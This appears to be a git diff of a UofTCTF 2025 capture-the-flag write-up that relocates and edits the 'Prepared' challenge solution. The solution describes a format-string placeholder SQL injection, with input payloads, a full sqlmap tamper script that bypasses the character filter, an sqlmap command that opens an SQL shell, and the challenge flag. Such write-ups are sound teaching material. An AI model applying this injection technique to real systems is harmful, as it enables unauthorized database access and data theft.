@@ -20,279 +20,6 @@ All challenges can be found here https://github.com/UofTCTF/uoftctf-2025-chals-p
 - Scavenger Hunt (100)
 
 > Not it any order
-### Prepared: Flag 1 
-
-> 33 Solves
-
-This was the challenge description.
-```
-Who needs prepared statements and parameterized queries when you can use the amazing new QueryBuilder™ and its built-in DirtyString™ sanitizer?
-
-Author: SteakEnthusiast
-```
-
-The sever implemented a simple login system using MariaDB and Flask. We were given the server code so it was pretty easy to find out.
-
-The app implement's their own version of SQL filtering so I figured out that we might need some kind of SQL injection attack to work.
-
-However, there was some filtering happening.
-
-Username and passwords were being filtered by `DirtyString` which returned error for any non-ascii characters and any characters listed in `MALICIOUS_CHARS`. 
-
-```python
-du = DirtyString(username, 'username')
-dp = DirtyString(password, 'password')
-```
-
-```python
-MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]
-```
-
-Then the username `du` and password (`dp`) were sent to `QueryBuilder `:
-
-```python
-qb = QueryBuilder(
-    "SELECT * FROM users WHERE username = '{username}' AND password = '{password}'", [du, dp]
-)
-```
-
-This is how the `QueryBuilder` Object for initialized:
-```python
-def __init__(self, query_template, dirty_strings):
-	self.query_template = query_template
-	self.dirty_strings = {ds.key: ds for ds in dirty_strings}
-	self.placeholders = self.get_all_placeholders(self.query_template)
-```
-
-The `query_template` is the SQL query (string) and `dirty_strings` is an dictionary (HashMap), for example: `{"username": du, "password": dp}`.
-
-The `placeholders` is basically array (list) of strings string that matches this regex `\{(\w+)\}`, for example, `{username}` and `{password}` both of them would match the regex mentioned here.
-
-In our case, this function will return `['username', 'password']`
-```python
-def get_all_placeholders(self, query_template=None):
-	pattern = re.compile(r'\{(\w+)\}')
-	return pattern.findall(query_template)
-```
-
-
-Then we have the `build_query` function that does the most of the work, in this class. I have added some comments in the function so it makes more sense.
-
-```python
-def build_query(self):
-	# This is the sql String
-	# E.G., SELECT * FROM users WHERE username = '{username}'...
-	query = self.query_template
-	# array of "{word}". E.g., ['username', 'password'] 
-	self.placeholders = self.get_all_placeholders(query)
-
-	while self.placeholders:
-		# key = first item in the placeholder array
-		key = self.placeholders[0]
-		# `format_map` will create python dictionary (hashmap)
-		# The distionary key(s) would be each item from placeholders
-		# Values is an function that takes in two argument
-		# first argument is not important (not being used)
-		# second argument is the supposed to be some string
-		# The function will return "{second_argument_text}" as the value
-		# E.g., format_map['password'](None, "apple") returns "{apple}"
-		format_map = dict.fromkeys(self.placeholders, lambda _, k: f"{{{k}}}")
-
-		for k in self.placeholders:
-			# Basically if the `k` in ["username", "password"] (initially)
-			if k in self.dirty_strings:
-				# if first item in placeholders == `k`
-				if key == k:
-					# Get the value
-					# `dirty_strings` is an dict that stores `DirtyString`
-					format_map[k] = self.dirty_strings[k].get_value()
-			else:
-				format_map[k] = DirtyString
-		# Remider, `query` is an string
-		# `format_map` works similar to .format string but takes in dict as mapping
-		query = query.format_map(type('FormatDict', (), {
-			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
-		})())
-		# See if there are more strings in this format "\{(\w+)\}"
-		self.placeholders = self.get_all_placeholders(query)
-		
-	return query
-```
-
-Let's break down, this part even more:
-```python
-query = query.format_map(type('FormatDict', (), {
-			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
-		})())
-```
-
-For example, when I run this
-```python
-print("Hello my name is {username}".format_map({
-    "username": "cool_user", 
-    "password": "vry_secure_pass"
-}))
-```
-
-The output would be:
-```
-Hello my name is cool_user
-```
-
-I can also do something like this:
-```python
-print("Hello my name is {username[prefix]}{username[suffix]}".format_map({
-    "username": {
-        "prefix": "cool",
-        "suffix": "user"
-    }, 
-    "password": "vry_secure_pass"
-}))
-```
-
-The output would be:
-```
-Hello my name is cooluser
-```
-
-Cool thing about this is that we can also call things that are inside of a class
-```python
-class Car:
-    model = "Toyota"
-
-my_car = Car()
-print("Hello my name is {car.model}".format_map({
-    "car": my_car
-}))
-```
-
-
-Now, remember that when `placeholders` is anything other than `dirty_strings` the `format_map[k]` will equal `DirtyString`. This means that there is a possibility that we might be able to access `DirtyString.MALICIOUS_CHARS` and inner workings of `DirtyString` class.
-
-
-When I sent:
-```
-username:user
-password:value
-```
-
-This is what happened:
-```
-dirty_strings: {'username': user, 'password': value}
-
-self.placeholders: ['username', 'password']
-
-format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}
-
-format_map (after for loop): {'username': 'user', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}
-
-self.placeholders: ['password']
-
-format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943940>}
-
-format_map (after for loop): {'password': 'value'}
-```
-> This output is behind the scenes of what happened. I used print statements to get these
-
-This is what happens when we send in this in the post request:
-
-```
-username:user{x}
-password:value
-```
-
-```
-dirty_strings: {'username': user{x}, 'password': value}
-
-self.placeholders: ['username', 'password']
-
-format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}
-
-format_map (after for loop): {'username': 'user{x}', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}
-
-self.placeholders: ['x', 'password']
-
-format_map (before for loop): {'x': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}
-
-format_map (after for loop): {'x': <class '__main__.DirtyString'>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}
-self.placeholders: ['password']
-
-format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd49438b0>}
-
-format_map (after for loop): {'password': 'value'}
-```
-> This output is behind the scenes of what happened. I used print statements to get these
-
-
-You can see that `{x}` becomes instance of `DirtyString` object at some point. Which means, that we can access previous not acessable chracters through `{x}{x.MALICIOUS_CHARS}`.
-
-For example, when I send in this POST request:
-```
-username:user{x}{x.MALICIOUS_CHARS}
-password:value
-```
-
-This is what I get in http response:
-```
-Database query failed: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\', '/', '*', '+%', '-', ';', '#', '(', ')', ' ', ',']' AND password = 'value'' at line 1
-```
-> This is the user visible output that the server returns due to SQL errors.
-
-
-Now that we can use restricted values, I created a custom tamper script in `sqlmap` which will basically bypass the filters via `MALICIOUS_CHARS` array index.
-
-`custom_tamper.py` file
-```python
-#!/usr/bin/env python
-def tamper(payload, **kwargs):
-    """
-    Replaces each character defined in `mapping` with the corresponding 
-    "{apple.MALICIOUS_CHARS[index]}" placeholder in the given payload.
-    """
-
-    mapping = {
-        '"': '{a.MALICIOUS_CHARS[0]}',
-        "'": '{a.MALICIOUS_CHARS[1]}',
-        '\\': '{a.MALICIOUS_CHARS[2]}',
-        '/': '{a.MALICIOUS_CHARS[3]}',
-        '*': '{a.MALICIOUS_CHARS[4]}',
-        '+%': '{a.MALICIOUS_CHARS[5]}',  # '+%'
-        '-': '{a.MALICIOUS_CHARS[6]}',
-        ';': '{a.MALICIOUS_CHARS[7]}',
-        '#': '{a.MALICIOUS_CHARS[8]}',
-        '(': '{a.MALICIOUS_CHARS[9]}',
-        ')': '{a.MALICIOUS_CHARS[10]}',
-        ' ': '{a.MALICIOUS_CHARS[11]}',
-        ',': '{a.MALICIOUS_CHARS[12]}'
-    }
-
-    # Perform replacements in the payload
-    if payload:
-        for original_char, placeholder in mapping.items():
-            payload = payload.replace(original_char, placeholder)
-        payload += "{a}"
-
-    return payload
-```
-> I know there is a better way to write this script, but at the time when I was solving this challenge, this is the first thing that came to my mind.
-
-
-Now, we will use `sqlmap` on the target
-```bash
-sqlmap -u "<URL>" --data="username=admin&password=1234" --method=POST --dbms="mariadb" --tamper=custom_tamper.py -p username --sql-shell
-```
-
-Once you have the sql-shell, you can run these commands to get the flag:
-```bash
-sql-shell> use prepared_db;
-sql-shell> select * from flags;
-```
-
-Then you will get the flag:
-```
-uoftctf{r3m3mb3r_70_c173_y0ur_50urc35_1n_5ql_f0rm47}
-```
-
 
 ### 1337 v4ul7 (495)
 
@@ -781,4 +508,291 @@ Flag 7 / 7 = `c0d3!!}`
 Flag:
 ```
 uoftctf{ju57_k33p_c4lm_4nd_1n5p3c7_411_7h3_4pp5_50urc3_c0d3!!}
+```
+
+----
+
+### Prepared: Flag 1 
+> 33 Solves
+#### Introduction
+
+This was the challenge description.
+```
+Who needs prepared statements and parameterized queries when you can use the amazing new QueryBuilder™ and its built-in DirtyString™ sanitizer?
+
+Author: SteakEnthusiast
+```
+
+The server implemented a simple login system using MariaDB and Flask. We were given the server code, so it was pretty easy to figure out.
+
+The app implements its own version of SQL filtering, so I figured we might need some kind of SQL injection attack to work (it is almost never a good idea to implement your own version of SQL parser).
+
+#### Background
+
+Usernames and passwords were being filtered by `DirtyString`, which returned an error for any non-ASCII characters and any characters listed in `MALICIOUS_CHARS`.
+
+```python
+du = DirtyString(username, 'username')
+dp = DirtyString(password, 'password')
+```
+
+```python
+MALICIOUS_CHARS = ['"', "'", "\\", "/", "*", "+" "%", "-", ";", "#", "(", ")", " ", ","]
+```
+
+Then the username `du` and password `dp` were sent to `QueryBuilder`:
+```python
+qb = QueryBuilder(
+    "SELECT * FROM users WHERE username = '{username}' AND password = '{password}'", [du, dp]
+)
+```
+
+This is how the `QueryBuilder` object was initialized:
+```python
+def __init__(self, query_template, dirty_strings):
+	self.query_template = query_template
+	self.dirty_strings = {ds.key: ds for ds in dirty_strings}
+	self.placeholders = self.get_all_placeholders(self.query_template)
+```
+
+The `query_template` is the SQL query (string), and `dirty_strings` is a dictionary (HashMap), for example: `{"username": du, "password": dp}`.
+
+The `placeholders` is basically an array (list) of strings that match this regex `\{(\w+)\}`, for example, `{username}` and `{password}` both match the regex mentioned here.
+
+In our case, this function will return `['username', 'password']`
+```python
+def get_all_placeholders(self, query_template=None):
+	pattern = re.compile(r'\{(\w+)\}')
+	return pattern.findall(query_template)
+```
+
+----
+
+Then we have the `build_query` function that does most of the work in this class. I have added some comments in the function so it makes more sense.
+
+```python
+def build_query(self):
+	# This is the SQL string
+	# E.g., SELECT * FROM users WHERE username = '{username}'...
+	query = self.query_template
+	# Array of "{word}". E.g., ['username', 'password']
+	self.placeholders = self.get_all_placeholders(query)
+
+	while self.placeholders:
+		# key = first item in the placeholder array
+		key = self.placeholders[0]
+		# `format_map` will create a Python dictionary (hashmap)
+		# The dictionary keys would be each item from placeholders
+		# The values are a function that takes two arguments
+		# (the first argument is not important, the second is the string)
+		# The function will return "{second_argument_text}" as the value
+		# E.g., format_map['password'](None, "apple") returns "{apple}"
+		format_map = dict.fromkeys(self.placeholders, lambda _, k: f"{{{k}}}")
+
+		for k in self.placeholders:
+			# Basically if `k` in ["username", "password"] (initially)
+			if k in self.dirty_strings:
+				# If the first item in placeholders == `k`
+				if key == k:
+					# Get the value
+					# `dirty_strings` is a dict that stores `DirtyString`
+					format_map[k] = self.dirty_strings[k].get_value()
+			else:
+				format_map[k] = DirtyString
+		# Reminder, `query` is a string
+		# `format_map` works similarly to .format string but takes a dict as a mapping
+		query = query.format_map(type('FormatDict', (), {
+			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("", k)
+		})())
+		# See if there are more strings in this format "\{(\w+)\}"
+		self.placeholders = self.get_all_placeholders(query)
+		
+	return query
+```
+
+----
+
+Let's break down this part even more:
+```python
+query = query.format_map(type('FormatDict', (), {
+			'__getitem__': lambda _, k: format_map[k] if isinstance(format_map[k], str) else format_map[k]("",k)
+		})())
+```
+
+For example, when I run:
+```python
+print("Hello my name is {username}".format_map({
+    "username": "cool_user", 
+    "password": "vry_secure_pass"
+}))
+```
+
+The output would be:
+```
+Hello my name is cool_user
+```
+
+I can also do something like this:
+```python
+print("Hello my name is {username[prefix]}{username[suffix]}".format_map({
+    "username": {
+        "prefix": "cool",
+        "suffix": "user"
+    }, 
+    "password": "vry_secure_pass"
+}))
+```
+
+The output would be:
+```
+Hello my name is cooluser
+```
+
+A cool thing about this is that we can also call things inside a class:
+```python
+class Car:
+    model = "Toyota"
+
+my_car = Car()
+print("Hello my name is {car.model}".format_map({
+    "car": my_car
+}))
+```
+
+The output would be:
+```
+Hello my name is Toyota
+```
+
+-----
+
+Now, remember that when `placeholders` is anything other than `dirty_strings`, `format_map[k] = DirtyString`. This means there is a possibility we might be able to access `DirtyString.MALICIOUS_CHARS` and the inner workings of the `DirtyString` class.
+
+When I send:
+```
+username:user
+password:value
+```
+
+This is what happened (all the variables and their values):
+```
+dirty_strings: {'username': user, 'password': value}
+
+self.placeholders: ['username', 'password']
+
+format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}
+
+format_map (after for loop): {'username': 'user', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943820>}
+
+self.placeholders: ['password']
+
+format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943940>}
+
+format_map (after for loop): {'password': 'value'}
+```
+> This output is behind the scenes of what happened. I used print statements to get these.
+
+----
+
+This is what happens when we send in the POST request:
+```
+username:user{x}
+password:value
+```
+
+```
+dirty_strings: {'username': user{x}, 'password': value}
+
+self.placeholders: ['username', 'password']
+
+format_map (before for loop): {'username': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}
+
+format_map (after for loop): {'username': 'user{x}', 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd5b55820>}
+
+self.placeholders: ['x', 'password']
+
+format_map (before for loop): {'x': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}
+
+format_map (after for loop): {'x': <class '__main__.DirtyString'>, 'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd4943a60>}
+self.placeholders: ['password']
+
+format_map (before for loop): {'password': <function QueryBuilder.build_query.<locals>.<lambda> at 0x7f3cd49438b0>}
+
+format_map (after for loop): {'password': 'value'}
+```
+> This output is behind the scenes of what happened. I used print statements to get these.
+
+You can see that `{x}` becomes an instance of the `DirtyString` object at some point, meaning we can access previously inaccessible characters via `{x}{x.MALICIOUS_CHARS}`.
+
+----
+
+
+For example, when I send in this POST request:
+```
+username:user{x}{x.MALICIOUS_CHARS}
+password:value
+```
+
+I get this in the HTTP response:
+```
+Database query failed: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\', '/', '*', '+%', '-', ';', '#', '(', ')', ' ', ',']' AND password = 'value'' at line 1
+```
+> This is the user-visible output that the server returns due to SQL errors.
+
+----
+
+#### Solution
+
+Now that we can use restricted values, I created a custom tamper script in `sqlmap` that will basically bypass the filters via the `MALICIOUS_CHARS` array index.
+
+`custom_tamper.py` file
+```python
+#!/usr/bin/env python
+def tamper(payload, **kwargs):
+    """
+    Replaces each character defined in `mapping` with the corresponding 
+    "{apple.MALICIOUS_CHARS[index]}" placeholder in the given payload.
+    """
+
+    mapping = {
+        '"': '{a.MALICIOUS_CHARS[0]}',
+        "'": '{a.MALICIOUS_CHARS[1]}',
+        '\\': '{a.MALICIOUS_CHARS[2]}',
+        '/': '{a.MALICIOUS_CHARS[3]}',
+        '*': '{a.MALICIOUS_CHARS[4]}',
+        '+%': '{a.MALICIOUS_CHARS[5]}',  # '+%'
+        '-': '{a.MALICIOUS_CHARS[6]}',
+        ';': '{a.MALICIOUS_CHARS[7]}',
+        '#': '{a.MALICIOUS_CHARS[8]}',
+        '(': '{a.MALICIOUS_CHARS[9]}',
+        ')': '{a.MALICIOUS_CHARS[10]}',
+        ' ': '{a.MALICIOUS_CHARS[11]}',
+        ',': '{a.MALICIOUS_CHARS[12]}'
+    }
+
+    # Perform replacements in the payload
+    if payload:
+        for original_char, placeholder in mapping.items():
+            payload = payload.replace(original_char, placeholder)
+        payload += "{a}"
+
+    return payload
+```
+> I know there is a better way to write this script, but when I was solving this challenge, this was the first thing that came to mind.
+
+
+Now, we will use `sqlmap` on the target:
+```bash
+sqlmap -u "<URL>" --data="username=admin&password=1234" --method=POST --dbms="mariadb" --tamper=custom_tamper.py -p username --sql-shell
+```
+
+Once you have the SQL shell, you can run these commands to get the flag:
+```bash
+sql-shell> use prepared_db;
+sql-shell> select * from flags;
+```
+
+Then you will get the flag:
+```
+uoftctf{r3m3mb3r_70_c173_y0ur_50urc35_1n_5ql_f0rm47}
 ```
